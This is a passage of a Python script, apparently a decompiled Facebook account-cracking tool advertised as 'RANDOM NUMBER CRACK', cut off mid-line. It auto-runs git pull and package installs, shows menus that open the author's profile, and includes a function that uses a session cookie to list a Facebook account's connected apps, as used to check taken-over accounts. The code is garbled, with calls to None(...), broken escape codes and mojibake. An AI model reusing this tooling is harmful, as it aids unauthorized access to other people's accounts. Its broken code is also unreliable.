import os
import sys
import time
import requests
import uuid
os.system('git pull')
os.system('pkg install curl')

logo = ("""\33[132m
\33[1;32m╔══════════════════════════════════════════════════════════╗\33[1;93m
\33[1;32m║	         \33[1;93m ─━㋱ASSALAMUALAIKUM㋱━─\33[1;32m	           ║
\33[1;32m╔══════════════════════════════════════════════════════════╗
\33[1;32m║	  
\33[1;31m║   
\33[1;33m║                     SYCHO GUJJAR
\33[1;34m║  
\33[1;35m║  
\33[1;38m║  
\33[1;31m║  
\33[1;34m║                                                  
\33[1;32m╚══════════════════════════════════════════════════════════╝
\33[1;32m╔══════════════════════════════════╗╔══════════════════════╗
\33[1;32m║NOTE : \33[37;41mTHIS TOOLS IS FREE\33[0;m\33[1;32m         ║║        \1b[1;91m___T_\33[1;32m         ║
\33[1;33m║══════════════════════════════════║║       \1b[1;91m| o o |\33[1;32m        ║
\33[1;34m║AUTHOR    : SYCHO GUJJAR           ║║       \1b[1;91m|__-__|\33[1;32m        ║
\33[1;35m║══════════════════════════════════║║       \1b[1;91m/| []|'\33[1;32m        ║
\33[1;36m║WHATSAPP  : Sorry Bro Its Personal        ║║     \1b[1;91m()/|___|\)\33[1;32m      ║
\33[1;37m║══════════════════════════════════║║        \1b[1;91m|_|_|\33[1;32m         ║
\33[1;38m║GITHUB    : SYCHO GUJJAR     ║║       \1b[1;91m|_| |_|\33[1;32m        ║
\33[1;39m║══════════════════════════════════║║                      ║
\33[1;31m║SERVER    : DATA + WIFI WORKING   ║╚══════════════════════╝
\33[1;32m║══════════════════════════════════════════════════════════╗
\33[1;33m║FACEBOOK LINK : \1b[1;91mhttps://https://www.facebook.com/profile.php?id=100079935487041\33[1;32m  ║
\33[1;34m║══════════════════════════════════════════════════════════║
\33[1;35m║FB PAGE LINK  : \1b[1;91mhttps://https://www.facebook.com/profile.php?id=100079935487041\33[1;32m    ║
\33[1;36m╚══════════════════════════════════════════════════════════╝\33[1;37m""")
def ud():
    os.system('clear')
    jalan(logo)
    print(' \33[1;33m[1] FOLLOW   MY PGE')
    print(' [2] EXIT')
    opt = input('\   Choose option >>>\33[1;37m ')
    if opt == '1':
        os.system('xdg-open https://www.facebook.com/profile.php?id=100079935487041')
        FD()
        return None
    None('\\1b[1;31mEXIT\1b[0;97m')


def FD():
    os.system('clear')
    print(logo)
    print('\1b[1;33m [1] FOLLOW THIS MY FACEBOOK ')
    print(' [2] EXIT')
    opt = input('\  \1b[1;32m Choose option >>> ')
    if opt == '1':
        os.system('xdg-open https://www.facebook.com/profile.php?id=100079935487041/')
        o()
        return None
    None('\\1b[1;31mEXIT\1b[0;97m')


def o():
    os.system('clear')
    jalan(logo)
    jalan('\3[37;41m\ RANDOM NUMBER CRACK\3[0;m')
    print('')
    jalan('\1b[1;33m [1]\1b[1;33m RANDOM CRACK ')
    jalan('\1b[1;31m [2] \1b[1;32mCONTACT ME ON FACEBOOK')
    jalan(' \1b[1;30m[3] \1b[1;32mSUBSCRIBE MY CHANNEL')
    jalan(' \1b[1;32m[4] \1b[1;32mFOLLOW FACEBOOK PAGE')
    jalan(' \1b[1;32m[00] \1b[1;31mEXIT')
    opt = input('\   \1b[1;32m Choose option >>> ')
    if opt == '1':
        i()
    if opt == '2':
        os.system('xdg-open https://www.facebook.com/profile.php?id=100079935487041')
        return None
    if opt == '3':
        os.system('xdg-open https://www.facebook.com/profile.php?id=100079935487041')
        return None
    if opt == '4':
        os.system('xdg-open https://www.facebook.com/profile.php?id=100079935487041')
        return None
    if opt == '0':
        os.system('exit')
        return None
    None('\\1b[1;31m  Choose valid option\1b[0;97m')


import os,sys,time,json,random,re,string,platform,base64,uuid
os.system("git pull")
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup
import requests as ress
from datetime import date
from datetime import datetime
from time import sleep
from time import sleep as waktu
try:
    import requests
    from concurrent.futures import ThreadPoolExecutor as ThreadPool
    import mechanize
    from requests.exceptions import ConnectionError
except ModuleNotFoundError:
    os.system('pip install mechanize requests futures bs4==2 > /dev/null')
    os.system('pip install bs4')
    
def cek_apk(session,coki):
    w=session.get("https://free.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        print(f'\%s[%s!%s] %sSorry there is no Active  Apk%s  '%(N,M,N,M,N))
    else:
        print(f'\[ðŸŽ®] %s \1b[1;95m â˜† Your Active Apps â˜†     :{WHITE}'%(GREEN))
        for i in range(len(game)):
            print(f"\[%s%s] %s%s"%(N,i+1,game[i].replace("Ditambahkan pada"," Ditambahkan pada"),N))
        #else:
            #print(f'\ %s[%s!%s] Sorry, Apk check failed invalid cookie'%(N,M,N))
    w=session.get("https://free.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"
